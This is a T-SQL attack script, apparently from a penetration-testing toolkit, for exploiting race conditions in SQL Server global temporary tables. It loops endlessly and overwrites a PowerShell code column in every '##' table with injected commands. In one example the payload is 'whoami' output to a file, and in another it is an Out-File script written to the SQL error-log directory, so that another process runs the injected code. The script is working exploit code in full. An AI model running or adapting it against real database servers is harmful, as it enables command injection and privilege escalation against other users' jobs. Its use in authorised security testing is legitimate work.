-------------------------------------------------------
-- Script: Get-GlobalTempTable-RaceUpdate
-- Author: Scott Sutherland
-- Description: 
-- Update contents of all global temp tables using
-- user defined code, this can be useful for exploiting 
-- some race conditions.
-------------------------------------------------------

------------------------------------------------------
-- Example 1: Known Table, Known Column
------------------------------------------------------

-- Loop forever
WHILE 1=1 
BEGIN	
	-- Update table contents with custom powershell script
	-- In real world, use the path below, because it is writable by the restricted SQL Server service account, and c:\windows\temp\ is not.
	-- DECLARE @SQLerrorlogDir VARCHAR(256);SELECT @SQLerrorlogDir = master.dbo.fn_SQLServerErrorLogDir() 
	DECLARE @mycommand varchar(max)
	SET @mycommand = 'UPDATE t1 SET t1.PSCode = ''whoami > c:\windows\temp\finishline.txt'' FROM ##temp123  t1'		
	EXEC(@mycommand)	
END

------------------------------------------------------
-- Example 2: Unknown Table, Known Column
------------------------------------------------------

-- Create variables
DECLARE @PsFileName NVARCHAR(4000)
DECLARE @TargetDirectory NVARCHAR(4000)
DECLARE @PsFilePath NVARCHAR(4000)

-- Set filename for PowerShell script
Set @PsFileName = 'finishline.txt'

-- Set target directory for PowerShell script to be written to
SELECT  @TargetDirectory = REPLACE(CAST((SELECT SERVERPROPERTY('ErrorLogFileName')) as VARCHAR(MAX)),'ERRORLOG','')

-- Create full output path for creating the PowerShell script 
SELECT @PsFilePath = @TargetDirectory +  @PsFileName

-- Loop forever 
WHILE 1=1 
BEGIN	
	-- Set delay
	WAITFOR DELAY '0:0:1'

	-- Setup variables
	DECLARE @mytempname varchar(max)

	-- Iterate through all global temp tables 
	DECLARE MY_CURSOR CURSOR 
		FOR SELECT name FROM tempdb.sys.tables WHERE name LIKE '##%'
	OPEN MY_CURSOR
	FETCH NEXT FROM MY_CURSOR INTO @mytempname 
	WHILE @@FETCH_STATUS = 0
	BEGIN 	    
		-- Print table name
		PRINT @mytempname 
	
		-- Update contents of known column with ps script in an unknown temp table	
		DECLARE @mycommand varchar(max)
		SET @mycommand = 'UPDATE t1 SET t1.PSCode = ''Write-Output "hello world" | Out-File "' + @PsFilePath + '"'' FROM ' + @mytempname + '  t1'
		EXEC(@mycommand)	

		-- Select table contents
		DECLARE @mycommand2 varchar(max)
		SET @mycommand2 = 'SELECT * FROM [' + @mytempname + ']'
		EXEC(@mycommand2)
	
		-- Next record
		FETCH NEXT FROM MY_CURSOR INTO @mytempname  
	END
	CLOSE MY_CURSOR
	DEALLOCATE MY_CURSOR
END

------------------------------------------------------
-- Example 3: Unknown Table, Unkown column
------------------------------------------------------
-- todo

